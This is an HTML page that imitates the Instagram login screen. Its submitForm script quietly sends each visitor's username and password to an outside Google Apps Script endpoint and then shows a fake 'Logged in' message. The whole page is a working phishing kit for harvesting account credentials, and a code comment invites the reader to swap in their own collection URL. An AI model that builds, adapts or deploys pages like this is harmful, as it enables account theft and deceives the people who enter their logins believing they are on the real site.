<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      box-sizing: border-box;
    }

    body {
      background-color: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #121212;
      padding: 40px 30px;
      border-radius: 12px;
      width: 320px;
      text-align: center;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.05);
    }

    .logo {
      font-family: 'Grand Hotel', cursive;
      font-size: 48px;
      color: #fff;
      margin-bottom: 30px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 12px;
      border: 1px solid #333;
      border-radius: 6px;
      background-color: #1e1e1e;
      color: #fff;
    }

    .password-container {
      position: relative;
    }

    .password-container input {
      padding-right: 50px;
    }

    .toggle-text {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 13px;
      color: #aaa;
      cursor: pointer;
      user-select: none;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #3897f0;
      color: white;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }

    .links, .footer {
      font-size: 14px;
      color: #999;
      margin-top: 16px;
    }

    .links a, .footer a {
      color: #999;
      text-decoration: none;
      margin: 0 5px;
      pointer-events: none;
    }

    .divider {
      margin: 20px 0;
      color: #666;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">Instagram</div>
    <input type="text" id="username" placeholder="Phone number, username, or email">
    <div class="password-container">
      <input type="password" id="password" placeholder="Password">
      <span class="toggle-text" onclick="togglePassword()">Show</span>
    </div>
    <button type="button" onclick="submitForm()">Log In</button>
    <div class="links">
      <a href="#">Forgot password?</a>
    </div>
    <div class="divider">OR</div>
    <div class="footer">
      Donâ€™t have an account?
      <a href="#">Sign up</a>
    </div>
  </div>

  <script>
    function togglePassword() {
      const passwordInput = document.getElementById("password");
      const toggleText = document.querySelector(".toggle-text");

      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        toggleText.textContent = "Hide";
      } else {
        passwordInput.type = "password";
        toggleText.textContent = "Show";
      }
    }

    function submitForm() {
      const scriptURL = 'https://script.google.com/macros/s/AKfycbwB7774L0QICIFgfZpQT6bhFQqNGykDiSZcVKSjDROhbIGhsXMn6axFNSm4yewpMgv9_A/exec'; // <-- Replace this!
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      fetch(scriptURL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
      });

      alert("Logged in");
    }
  </script>
</body>
</html>
